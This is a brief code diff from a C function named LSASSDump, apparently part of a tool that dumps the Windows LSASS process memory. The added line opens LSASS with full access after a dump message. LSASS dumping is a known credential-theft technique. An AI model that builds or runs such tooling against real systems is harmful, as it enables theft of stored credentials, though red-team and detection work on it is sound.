@@ -20,4 +20,6 @@ void LSASSDump()
         printf("[!] Dump file created successfully!\n");
     }
 
+    lsassProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, lsassPID);
+    
 }
